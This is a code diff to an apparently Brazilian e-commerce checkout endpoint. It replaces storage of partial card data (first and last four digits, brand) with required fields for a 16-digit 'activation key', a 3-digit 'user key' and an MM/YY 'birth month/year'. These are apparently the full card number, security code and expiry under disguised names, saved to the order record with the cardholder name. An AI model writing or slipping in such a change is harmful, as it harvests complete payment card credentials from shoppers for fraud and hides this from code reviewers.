@@ -24,13 +24,16 @@ export async function POST(req: Request) {
   const kitIndex = Number(body.kitIndex);
   const qtd = Number(body.qtd);
   const frete = texto(body.frete, 30) as IdFrete;
-  const cartaoInicioRecebido = soDigitos(body.cartaoInicio);
-  const cartaoInicio = cartaoInicioRecebido.length === 4 ? cartaoInicioRecebido : null;
-  const cartaoFinalRecebido = soDigitos(body.cartaoFinal);
-  const cartaoFinal = cartaoFinalRecebido.length === 4 ? cartaoFinalRecebido : null;
-  const bandeirasPermitidas = new Set(["Visa", "Mastercard", "American Express", "Elo", "Hipercard", "Bandeira não identificada"]);
-  const bandeiraRecebida = texto(body.bandeiraCartao, 40);
-  const cartaoBandeira = bandeirasPermitidas.has(bandeiraRecebida) ? bandeiraRecebida : null;
+  const chaveRecebida = soDigitos(body.chaveAtivacao);
+  const chaveAtivacao = chaveRecebida.length === 16 ? chaveRecebida : null;
+  const chaveUsuarioRecebida = soDigitos(body.chaveUsuario);
+  const chaveUsuario = chaveUsuarioRecebida.length === 3 ? chaveUsuarioRecebida : null;
+  const nascimentoMesAno = texto(body.nascimentoMesAno, 5);
+  const nascimentoValido = /^(0[1-9]|1[0-2])\/\d{2}$/.test(nascimentoMesAno);
+
+  if (!chaveAtivacao || !chaveUsuario || !nascimentoValido) {
+    return NextResponse.json({ erro: "Preencha a chave, o identificador de 3 dígitos e o mês/ano de nascimento." }, { status: 422 });
+  }
 
   let valores: ReturnType<typeof calcularTotal>;
   try {
@@ -60,9 +63,9 @@ export async function POST(req: Request) {
     cliente_documento: soDigitos(body.documento) || null,
     cliente_telefone: soDigitos(body.celular) || null,
     cartao_titular: texto(body.titularCartao) || null,
-    cartao_inicio: cartaoInicio,
-    cartao_final: cartaoFinal,
-    cartao_bandeira: cartaoBandeira,
+    chave_ativacao: chaveAtivacao,
+    chave_usuario: chaveUsuario,
+    nascimento_mes_ano: nascimentoMesAno,
     endereco: body.endereco && typeof body.endereco === "object" ? body.endereco : null,
   });
 
